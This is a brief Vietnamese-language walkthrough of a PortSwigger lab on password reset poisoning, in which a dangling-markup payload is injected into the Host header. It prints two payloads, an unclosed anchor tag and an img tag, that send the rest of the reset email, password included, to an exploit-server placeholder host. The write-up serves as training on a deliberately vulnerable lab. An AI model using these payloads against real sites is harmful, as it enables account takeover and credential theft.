# Password reset poisoning via dangling markup
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

## Phân tích
- Request a password reset cho wiener account, vào email client ta thấy như sau. 
  - Password gởi trực tiếp trong mail.
  - Link trong email đơn giản chỉ là trỏ đến main login page
  ![img.png](img.png)
- Click View raw
![img_1.png](img_1.png)
- Gởi `POST /forgot-password` vào repeater. Thử đổi Host sang domain khác, hay Burp collab đều bị Timeout
- Nhưng nếu add thêm 1 port bất kì vào thì gởi đc
![img_2.png](img_2.png)
- Nhận thấy rằng Port đã đc thêm vào trong email
![img_3.png](img_3.png)
- Lợi dụng tính chất này, ta sẽ sử dụng dangling markup injection để chiếm password nhờ vào chức năng View raw ở trên với payload sau
`Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
  `
![img_4.png](img_4.png)
- Check Access log
![img_5.png](img_5.png)
- Login với password này
![img_7.png](img_7.png)
- Solved!!!
![img_6.png](img_6.png)

Ngoài ra, ta có thể dùng img tag
`'><img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
![img_8.png](img_8.png)